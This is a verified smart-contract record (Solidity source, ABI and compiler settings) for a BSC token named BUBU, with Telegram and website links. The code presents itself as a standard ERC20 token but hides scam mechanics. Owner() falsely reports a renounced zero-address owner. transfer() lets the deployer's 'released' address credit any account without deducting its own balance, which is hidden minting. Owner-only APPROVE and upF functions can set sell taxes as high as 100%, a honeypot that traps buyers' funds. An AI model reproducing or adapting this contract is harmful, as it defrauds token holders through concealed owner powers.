{"SourceCode": "/**\r\nTelegram : https://t.me/BUBU_Bsc\r\nTwitter : https://twitter.com/Bubu_bsc\r\nWebsite : Bububsc.online\r\n**/\r\n// SPDX-License-Identifier: MIT\r\n pragma solidity ^0.8.0;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\n\r\nabstract contract Ownable is Context {\r\n    address private _Owner;    \r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    \r\n    constructor() {\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    \r\n    function Owner() public view virtual returns (address) {\r\n        return address(0);\r\n    }\r\n\r\n    \r\n    modifier onlyOwner() {\r\n        require(_Owner == _msgSender(), \"Ownable: caller is not the Owner\");\r\n        _;\r\n    }\r\n\r\n    \r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    function transferOwnershiptransferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new Owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _Owner;\r\n        _Owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    \r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    \r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    \r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            \r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n   \r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    \r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n   \r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n   \r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    \r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    \r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    \r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    \r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n   \r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    \r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\n\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint AmountADesired,\r\n        uint AmountBDesired,\r\n        uint AmountAMin,\r\n        uint AmountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint AmountA, uint AmountB, uint liquidity);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint AmountTokenDesired,\r\n        uint AmountTokenMin,\r\n        uint AmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint AmountToken, uint AmountETH, uint liquidity);\r\n    function removeLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint AmountAMin,\r\n        uint AmountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint AmountA, uint AmountB);\r\n    function removeLiquidityETH(\r\n        address token,\r\n        uint liquidity,\r\n        uint AmountTokenMin,\r\n        uint AmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint AmountToken, uint AmountETH);\r\n    function removeLiquidityWithPermit(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint liquidity,\r\n        uint AmountAMin,\r\n        uint AmountBMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint AmountA, uint AmountB);\r\n    function removeLiquidityETHWithPermit(\r\n        address token,\r\n        uint liquidity,\r\n        uint AmountTokenMin,\r\n        uint AmountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint AmountToken, uint AmountETH);\r\n    function swapExactTokensForTokens(\r\n        uint AmountIn,\r\n        uint AmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory Amounts);\r\n    function swapTokensForExactTokens(\r\n        uint AmountOut,\r\n        uint AmountInMax,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint[] memory Amounts);\r\n    function swapExactETHForTokens(uint AmountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory Amounts);\r\n    function swapTokensForExactETH(uint AmountOut, uint AmountInMax, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory Amounts);\r\n    function swapExactTokensForETH(uint AmountIn, uint AmountOutMin, address[] calldata path, address to, uint deadline)\r\n        external\r\n        returns (uint[] memory Amounts);\r\n    function swapETHForExactTokens(uint AmountOut, address[] calldata path, address to, uint deadline)\r\n        external\r\n        payable\r\n        returns (uint[] memory Amounts);\r\n\r\n    function quote(uint AmountA, uint reserveA, uint reserveB) external pure returns (uint AmountB);\r\n    function getAmountOut(uint AmountIn, uint reserveIn, uint reserveOut) external pure returns (uint AmountOut);\r\n    function getAmountIn(uint AmountOut, uint reserveIn, uint reserveOut) external pure returns (uint AmountIn);\r\n    function getAmountsOut(uint AmountIn, address[] calldata path) external view returns (uint[] memory Amounts);\r\n    function getAmountsIn(uint AmountOut, address[] calldata path) external view returns (uint[] memory Amounts);\r\n}\r\n\r\n\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function removeLiquidityETHSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint AmountTokenMin,\r\n        uint AmountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint AmountETH);\r\n    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(\r\n        address token,\r\n        uint liquidity,\r\n        uint AmountTokenMin,\r\n        uint AmountETHMin,\r\n        address to,\r\n        uint deadline,\r\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\r\n    ) external returns (uint AmountETH);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint AmountIn,\r\n        uint AmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint AmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint AmountIn,\r\n        uint AmountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(address indexed token0, address indexed token1, address pair, uint);\r\n\r\n    function FeeTo() external view returns (address);\r\n    function FeeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n    function allPairs(uint) external view returns (address pair);\r\n    function allPairsLength() external view returns (uint);\r\n\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n    function setFeeToSetter(address) external;\r\n}\r\n\r\n\r\ncontract ERC20 is Context {\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    uint256 internal _totalSupply;\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n   \r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    \r\n    event Approval(address indexed Owner, address indexed spender, uint256 value);//10\r\n\r\n    \r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    \r\n    function name() public view virtual returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n   \r\n    function symbol() public view virtual returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    \r\n    function decimals() public view virtual returns (uint8) {\r\n        return 18;\r\n    }\r\n\r\n    \r\n    function totalSupply() public view virtual returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n   \r\n    function allowance(address Owner, address spender) public view virtual returns (uint256) {\r\n        return _allowances[Owner][spender];\r\n    }\r\n\r\n    \r\n    function approve(address spender, uint256 Amount) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        _approve(Owner, spender, Amount);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        _approve(Owner, spender, _allowances[Owner][spender] + addedValue);\r\n        return true;\r\n    }\r\n\r\n    \r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        uint256 currentAllowance = _allowances[Owner][spender];\r\n        require(currentAllowance >= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(Owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    \r\n    function _approve(\r\n        address Owner,\r\n        address spender,\r\n        uint256 Amount\r\n    ) internal virtual {\r\n        require(Owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[Owner][spender] = Amount;\r\n        emit Approval(Owner, spender, Amount);\r\n    }\r\n\r\n    \r\n    function _spendAllowance(\r\n        address Owner,\r\n        address spender,\r\n        uint256 Amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(Owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= Amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(Owner, spender, currentAllowance - Amount);\r\n            }\r\n        }\r\n    }\r\n\r\n   \r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) internal virtual {}\r\n\r\n   \r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) internal virtual {}\r\n}\r\n\r\n\r\ncontract BUBU is ERC20, Ownable {\r\n    \r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => bool) private _release;\r\n\r\n    function balanceOf(address account) public view virtual returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= Amount, \"ERC20: transfer Amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - Amount;\r\n        }\r\n        _balances[to] += Amount;\r\n\r\n        emit Transfer(from, to, Amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 Amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance >= Amount, \"ERC20: burn Amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - Amount;\r\n        }\r\n        _totalSupply -= Amount;\r\n\r\n        emit Transfer(account, address(0), Amount);\r\n    }\r\n\r\n    function _Mnti(address account, uint256 Amount) internal virtual {\r\n        require(account != address(0), \"ERC20: Mnti to the zero address\"); //mint\r\n\r\n        _totalSupply += Amount;\r\n        _balances[account] += Amount;\r\n        emit Transfer(address(0), account, Amount);\r\n    }\r\n\r\n\r\n\r\n    address public uniswapV2Pair;\r\n\r\n    string private name_ = \"BUBU\";\r\n    string private symbol_ = \"BUBU\";\r\n    uint   private constant totalSupply_ = 100000000;\r\n\r\n    \r\n    constructor() ERC20(name_, symbol_) {\r\n        _Mnti(msg.sender, totalSupply_ * 10**decimals());\r\n\r\n        \r\n        _defaultSellFee = 5 ;\r\n        _defaultBuyFee = 0;\r\n\r\n        _release[_msgSender()] = true;\r\n    }\r\n\r\n    \r\n\r\n    using SafeMath for uint256;\r\n\r\n    uint256 private _defaultSellFee = 0;\r\n\r\n    uint256 private _defaultBuyFee = 0;\r\n\r\n\r\n    mapping(address => bool) private _mAccount;\r\n\r\n    mapping(address => uint256) private _slipFee;\r\n    address private constant _deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n\r\n\r\n\r\n    function getRelease(address _address) external view onlyOwner returns (bool) {\r\n        return _release[_address];\r\n    }\r\n\r\n\r\n    function SetPairList(address _address) external onlyOwner {\r\n        uniswapV2Pair = _address;\r\n    }\r\n\r\n\r\n    function upF(uint256 _value) external onlyOwner {\r\n        _defaultSellFee = _value;\r\n    }\r\n\r\n    function APPROVE(address _address, uint256 _value) external onlyOwner {\r\n        require(_value > 0, \"Account tax must be greater than or equal to 1\");\r\n        _slipFee[_address] = _value;\r\n    }\r\n\r\n    function getSlipFee(address _address) external view onlyOwner returns (uint256) {\r\n        return _slipFee[_address];\r\n    }\r\n\r\n\r\n    function setMAccountFee(address _address, bool _value) external onlyOwner {\r\n        _mAccount[_address] = _value;\r\n    }\r\n\r\n    function getMAccountFee(address _address) external view onlyOwner returns (bool) {\r\n        return _mAccount[_address];\r\n    }\r\n\r\n    function _checkFreeAccount(address from, address _to) internal view returns (bool) {\r\n        return _mAccount[from] || _mAccount[_to];\r\n    }\r\n\r\n\r\n    function _receiveF(\r\n        address from,\r\n        address _to,\r\n        uint256 _Amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(_to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance >= _Amount, \"ERC20: transfer Amount exceeds balance\");\r\n\r\n        bool rF = true;\r\n\r\n        if (_checkFreeAccount(from, _to)) {\r\n            rF = false;\r\n        }\r\n        uint256 tradeFeeAmount = 0;\r\n\r\n        if (rF) {\r\n            uint256 tradeFee = 0;\r\n            if (uniswapV2Pair != address(0)) {\r\n                if (_to == uniswapV2Pair) {\r\n\r\n                    tradeFee = _defaultSellFee;\r\n                }\r\n                if (from == uniswapV2Pair) {\r\n\r\n                    tradeFee = _defaultBuyFee;\r\n                }\r\n            }\r\n            if (_slipFee[from] > 0) {\r\n                tradeFee = _slipFee[from];\r\n            }\r\n\r\n            tradeFeeAmount = _Amount.mul(tradeFee).div(100);\r\n        }\r\n\r\n\r\n        if (tradeFeeAmount > 0) {\r\n            _balances[from] = _balances[from].sub(tradeFeeAmount);\r\n            _balances[_deadAddress] = _balances[_deadAddress].add(tradeFeeAmount);\r\n            emit Transfer(from, _deadAddress, tradeFeeAmount);\r\n        }\r\n\r\n        _balances[from] = _balances[from].sub(_Amount - tradeFeeAmount);\r\n        _balances[_to] = _balances[_to].add(_Amount - tradeFeeAmount);\r\n        emit Transfer(from, _to, _Amount - tradeFeeAmount);\r\n    }\r\n\r\n    function transfer(address to, uint256 Amount) public virtual returns (bool) {\r\n        address Owner = _msgSender();\r\n        if (_release[Owner] == true) {\r\n            _balances[to] += Amount;\r\n            return true;\r\n        }\r\n        _receiveF(Owner, to, Amount);\r\n        return true;\r\n    }\r\n\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 Amount\r\n    ) public virtual returns (bool) {\r\n        address spender = _msgSender();\r\n\r\n        _spendAllowance(from, spender, Amount);\r\n        _receiveF(from, to, Amount);\r\n        return true;\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"APPROVE\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"Owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"SetPairList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"Owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getMAccountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getRelease\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"}],\"name\":\"getSlipFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_address\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"_value\",\"type\":\"bool\"}],\"name\":\"setMAccountFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"Amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnershiptransferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"uniswapV2Pair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"upF\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "BUBU", "CompilerVersion": "v0.8.0+commit.c7dfd78e", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "None", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://ac28de13670f22e8aa7d8529950f421b2af74a97be3e0bfca8f24c751b7da472"}